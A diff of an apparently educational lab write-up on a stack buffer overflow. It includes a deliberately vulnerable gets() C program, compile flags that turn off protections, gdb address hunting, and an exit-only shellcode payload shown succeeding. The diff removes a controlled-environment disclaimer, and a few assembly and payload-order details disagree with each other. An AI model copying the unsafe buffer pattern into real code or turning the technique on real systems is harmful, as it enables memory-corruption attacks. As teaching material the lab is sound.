@@ -11,218 +11,268 @@ title: AITA for Spilling Bytes and Crashing the Code?
 ---
 
 ## 0. AITA for Exploiting a Bug?
+Imagine you get a tiny coffee cup at a café, but instead of stopping at the top, you keep pouring—spilling coffee everywhere, even onto someone’s laptop. That’s how buffer overflow works in a program!
 
-Imagine you get a tiny coffee cup at a café—but instead of stopping at the top, you keep pouring, spilling coffee everywhere (even onto someone’s laptop). That’s similar to how a buffer overflow works in a program!
+Our vulnerable C program (vuln.c) asks for your name but doesn’t check the size. By overflowing the small buffer (8 bytes), we can overwrite memory and change how the program runs—like sneaking a new script into a magic show.
 
-In our vulnerable C program, a small buffer is allocated (8 bytes) for a name input, but because the program uses an unsafe function that doesn’t check the input length (namely, `gets()`), we can overflow this buffer. By overflowing, we overwrite the saved return address in memory and hijack program execution—much like spilling coffee in just the right spot to shut down a laptop.
+Instead of letting the program run forever, we’ll inject a special input to hijack execution and make it exit with a return code of 1.
 
-***
+Our "Mischievous" Plan:
+1. Compile with weak security
+2. Find memory targets using GDB
+3. Rewrite the return address to force an exit.
+4. Trigger the exit instead of running forever
+
+Boom—program hijacked! Just like spilling coffee in just the right spot to shut down a laptop. ☕💥
 
 ## 1. Compiling the Vulnerable Program
-
-We start with a source file (`vuln.c`) that looks like this:
+Create a source code file **vuln.c**. This program reads user input into a buffer of 8 bytes using the `gets()` function, which does not check input size, making it vulnerable to buffer overflow. The `gets()` function is dangerous because not only does it not limit input size, it also overwrites adjacent memory—including the saved return address that determines where execution continues when user inputs more than 8 bytes. In short, it allows a user to input more data than the buffer can hold.
 
 ```c
 #include <stdio.h>
 void vuln() {
-   char buffer[8]; // a small buffer (only 8 bytes)
-   gets(buffer);  // unsafe: does not limit input size
+   char buffer[8]; //a small buffer (only 8bytes)
+   gets(buffer);  // unsafe as it doesnt limit input size
 } 
 int main() { 
-   vuln();  // calls the function containing the vulnerability
-   while (1) { }  // keeps the program running indefinitely
+   vuln();  //calls the function containing the vulnerability
+   while (1) { }  //keeps the program running indefinitely
 }
 ```
 
-To make exploitation easier, we compile without modern security mechanisms using this command:
+To compile this program, we need to compile it in a way that removes security mechanisms to make exploitation easier.
 
-```bash
-$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
+```sh
+gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
 ```
 
-**Flag explanations:**
+So what do these flags do?
+- **-m32**: Compile for 32-bit architecture.
+- **-fno-stack-protector**: Disable stack protection (no canary values).
+- **-mpreferred-stack-boundary=2**: Forces a 4-byte aligned stack.
+- **-fno-pie**: No position-independent executable (PIE).
+- **-ggdb**: Includes debugging symbols.
+- **-z execstack**: Allows execution of code on the stack.
 
-* **-m32**: Compile for 32-bit architecture
-* **-fno-stack-protector**: Disable stack protection (no canary values)
-* **-mpreferred-stack-boundary=2**: Forces a 4-byte aligned stack
-* **-fno-pie**: Disables Position Independent Executable
-* **-ggdb**: Includes debugging symbols
-* **-z execstack**: Allows execution of code on the stack
+Since we are not using Linux, we installed WSL and ran the command: `sudo apt install gcc`. However, upon attempting to compile the vuln.c, we encountered a fatal error:
 
-*Note: If you run into an error like `fatal error: bits/libc-header-start.h: No such file or directory`, you need to install multilib support:*
-
-```bash
-$ sudo apt update
-$ sudo apt install gcc-multilib libc6-dev-i386
+```sh
+bits/libc-header-start.h: No such file or directory
 ```
 
-After installing the required dependencies, recompile the program. You might see warnings about using the deprecated `gets()` function, but that’s expected.
+This happened because multilib support, which allows compiling for 32-bit architecture, is missing from the WSL installation. To resolve this, we installed the required dependencies.
 
-***
-
-## 2. Finding Addresses with gdb
-
-Next, we use gdb to locate where our buffer is stored in memory and identify the saved return address to be overwritten.
-
-Start gdb:
-
-```bash
-$ gdb vuln
+```sh
+donna@Donna ~/CyberSec ❯ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
 ```
 
-Set a breakpoint at the vulnerable function (at the line with `gets(buffer);`):
+Error output:
+```sh
+vuln.c: In function 'vuln':
+vuln.c:5:1: warning: 'gets' is deprecated [-Wdeprecated-declarations]
+    5 | gets(buffer);
+      | ^~~~
+In file included from vuln.c:2:
+...
+```
 
-```bash
+Then we update and install the dependencies:
+
+```sh
+donna@Donna ~/CyberSec ❯ sudo apt update
+donna@Donna ~/CyberSec ❯ sudo apt install gcc-multilib libc6-dev-i386
+```
+
+Now, compile it again using the gcc command:
+
+```sh
+donna@Donna ~/CyberSec ❯ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
+```
+
+You'll see warnings about `gets` being dangerous, but the executable is successfully made.
+
+We then installed **gdb** using:
+
+```sh
+donna@Donna ~/CyberSec ❯ sudo apt install gdb
+```
+
+The installation output confirmed that gdb and its dependencies were installed.
+
+## 2. Finding Addresses
+To take advantage of the buffer overflow, we need to know where the program stores its memory. We ran the program inside a debugger (gdb) using:
+
+```sh
+donna@Donna ~/CyberSec ❯ gdb vuln
+```
+
+Inside gdb, we set a breakpoint at the `gets(buffer);` line:
+
+```sh
 (gdb) break 1
 ```
 
-Run the program:
+This tells gdb to stop execution at a specific line so we can examine memory. We then run the program:
 
-```bash
+```sh
 (gdb) run
 ```
 
-At the breakpoint, inspect the address of the buffer:
+It stops execution at line 5 (`gets(buffer);`). To know where we will inject our malicious input, we check where the “buffer” is stored in memory:
 
-```bash
+```sh
 (gdb) print &buffer
 ```
 
-For example, you might see:
+The output gives the starting address of our buffer (e.g., `0xffffd028`).
 
-```bash
-$1 = (char (*)[8]) 0xffffd028
-```
+Next, we check the registers to focus on the instruction pointer (eip), which controls program execution:
 
-Now, check the registers (especially the instruction pointer `eip`):
-
-```bash
+```sh
 (gdb) info registers
 ```
 
-Then, examine the stack frame to locate the saved return address:
+Our goal is to overwrite the saved return address, which we locate by inspecting the stack frame:
 
-```bash
+```sh
 (gdb) info frame
 ```
 
-You might see that the saved return address is stored at an address such as `0xffffd034`. This is the target we want to overwrite with our shellcode’s address.
-
-***
+The output shows that the saved return address is stored at an address (e.g., `0xffffd034`), and that’s where our shellcode will be injected.
 
 ## 3. Obtaining Machine Code
+To control how the program behaves after the overflow, we inject our own machine instructions (assembly code). We created an assembly file **asm.c** containing shellcode to exit the program cleanly.
 
-We need to craft shellcode that will cleanly exit the program. Start by writing a small assembly snippet in a file (for example, `asm.c`):
-
-**Original version:**
-
+Original **asm.c**:
 ```c
-#include <stdio.h>
 int main() {
     __asm__("xor %eax, %eax;"
-            "inc %eax;"
-            "mov %ebx, %eax;"
-            "leave;"
-            "ret;");
+    "inc %eax;"
+    "mov %ebx, %eax;"
+    "leave;"
+    "ret;"
+    );
 }
 ```
 
-Compile with:
+After compiling it using:
 
-```bash
-$ gcc -m32 -fno-stack-protector -fno-pie -ggdb -z execstack -std=c99 asm.c -o asm
+```sh
+gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm
 ```
 
-Then use `objdump` to extract the machine code:
+We then used the **objdump** tool to extract the machine code:
 
-```bash
-$ objdump -d asm > asmdump
+```sh
+objdump -d asm > asmdump
 ```
 
-The dump will show instructions such as:
+The output from **asmdump** is as follows:
 
-* `31 c0` → `xor    %eax, %eax`
-* `40`    → `inc    %eax`
-* `89 c3` → `mov    %eax, %ebx`
-* `cd 80` → `int    $0x80`
+Original asmdump:
+```sh
+0000118d <main>:
+    118d:	55                   	push   %ebp
+    118e:	89 e5                	mov    %esp,%ebp
+    1190:	31 c0                	xor    %eax,%eax
+    1192:	40                   	inc    %eax
+    1193:	89 c3                	mov    %eax,%ebx
+    1195:	c9                   	leave
+    1196:	c3                   	ret
+    1197:	b8 00 00 00 00       	mov    $0x0,%eax
+    119c:	5d                   	pop    %ebp
+    119d:	c3                   	ret
+```
 
-**Modified version for clean exit:**
+Before writing shellcode, we modify the assembly code to trigger a system call (`int 0x80`), which forces program termination. Our modified **asm.c** becomes:
 
-To exit the program with code 1, we modify the assembly code:
-
+Modified **asm.c**:
 ```c
-#include <stdio.h>
 int main() {
-    __asm__("xor %eax, %eax;"  // set EAX = 0
-            "inc %eax;"        // EAX = 1 (system call for exit)
-            "mov %eax, %ebx;"  // move exit code 1 into EBX (argument for exit)
-            "int 0x80;");      // trigger system call interrupt
+    __asm__("xor %eax, %eax;"
+    "inc %eax;"
+    "mov %ebx, %eax;"
+    "int 0x80;" 
+    ); //calls the system interrupt to exit
 }
 ```
 
-Recompile and run `objdump` again to get the modified machine code. The final shellcode in hex becomes:
+Explanation of the instructions:
+- `xor %eax, %eax;` sets EAX to 0.
+- `inc %eax;` increments EAX by 1. In Linux 32-bit, the system call number for `exit()` is 1.
+- `mov %ebx, %eax;` moves the value of EAX (which is 1) into EBX (the exit status).
+- `int 0x80;` triggers a system call to exit.
 
-```bash
+Compile the assembly code and extract the machine code again:
+
+```sh
+gcc -m32 -fno-stack-protector -fno-pie -std=c99 -masm=intel asm.c -o asm
+objdump -d asm > asmdump
+```
+
+The modified **asmdump** shows:
+
+```sh
+0000118d <main>:
+    118d:	55                   	push   %ebp
+    118e:	89 e5                	mov    %esp,%ebp
+    1190:	31 c0                	xor    %eax,%eax
+    1192:	40                   	inc    %eax
+    1193:	89 c3                	mov    %eax,%ebx
+    1195:	cd 80                	int    $0x80
+    1197:	b8 00 00 00 00       	mov    $0x0,%eax
+    119c:	5d                   	pop    %ebp
+    119d:	c3                   	ret 
+```
+
+The critical machine code instructions for our shellcode are:
+- `31 c0` → `xor    %eax,%eax`
+- `40` → `inc    %eax`
+- `89 c3` → `mov    %eax,%ebx`
+- `cd 80` → `int    $0x80`
+
+The final shellcode in hex is:
+```sh
 "\x31\xc0\x40\x89\xc3\xcd\x80"
 ```
 
-***
+## 4. Writing Down the Shellcode
+Shellcode is a sequence of machine instructions designed to be injected into a vulnerable program. We generate our shellcode and save it in a file named **egg**.
 
-## 4. Writing Down the Shellcode and Constructing the Payload
-
-Save your shellcode along with additional padding and the address overwrite into a file named `egg`. For example:
-
-```bash
+Generate the shellcode:
+```sh
 echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > egg
 ```
 
-Here’s what each part represents:
+This hex-encoded sequence corresponds to our modified assembly instructions, which exit the program cleanly.
 
-* **Padding (`\x41`…):** Fills the buffer (ASCII 'A's).
-* **Address overwrite (`\x28\xd0\xff\xff`):** Overwrites the saved return address with the start of the buffer (e.g., `0xffffd028`).
-* **Shellcode (`\x31\xc0\x40\x89\xc3\xcd\x80`):** Executes the system call to exit with code 1.
-
-You can tweak the number of padding bytes or the address depending on your environment.
-
-***
+Constructing the Payload:
+- `\x41\x41\x41\x41...` → Padding (filling the buffer) which represents ASCII ‘A’
+- `\x28\xd0\xff\xff` → Overwrite EIP with buffer address `0xffffd028`
+- `\x31\xc0\x40\x89\xc3\xcd\x80` → Shellcode to exit
 
 ## 5. Running the Program in gdb
+Once our shellcode is prepared, we inject and execute it inside gdb to confirm that it works correctly.
 
-Finally, test the exploit using gdb by feeding the `egg` file to the vulnerable program:
-
-```bash
-$ gdb vuln
+Start gdb with the vulnerable executable:
+```sh
+donna@Donna ~/CyberSec ❯ gdb vuln
 ```
 
-Within gdb, run:
-
-```bash
+Within gdb, feed the shellcode stored in **egg** to the program:
+```sh
 (gdb) run < egg
 ```
 
-A successful exploit will hijack execution so that the shellcode is run, and you should see the program exit with code 01:
-
-```bash
-[Inferior 1 (process ...) exited with code 01]
+Output:
+```sh
+Starting program: /home/donna/CyberSec/vuln < egg
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Inferior 1 (process 94460) exited with code 01]
+(gdb)
 ```
 
-This confirms that the buffer overflow successfully redirected execution to your shellcode.
+The shellcode injected via the **egg** file overwrites the return address in memory, redirecting execution to our injected instructions, which execute the `int 0x80` system call to exit. The program terminates with an exit status of `01`, confirming that we have successfully hijacked execution using a buffer overflow exploit.
 
-***
-
-## TL;DR
-
-* **Exploit Overview:** Overflow an 8-byte buffer to overwrite the saved return address.
-* **Goal:** Redirect execution to injected shellcode that calls `int 0x80` to exit with code 1.
-* **Process:**
-  1. Compile the vulnerable program with weak security settings.
-  2. Use gdb to locate memory addresses and the return address.
-  3. Craft and obtain machine code for your shellcode.
-  4. Create a payload (egg file) with padding, overwritten address, and shellcode.
-  5. Run the exploit via gdb to confirm success.
-
-✅ **Exploit successful!**
-
-***
-
-*Note:* Always ensure that such exploits are performed only in controlled environments and with permission. This write-up is for educational purposes only.
+TL;DR: ✅ Exploit successful 🎯
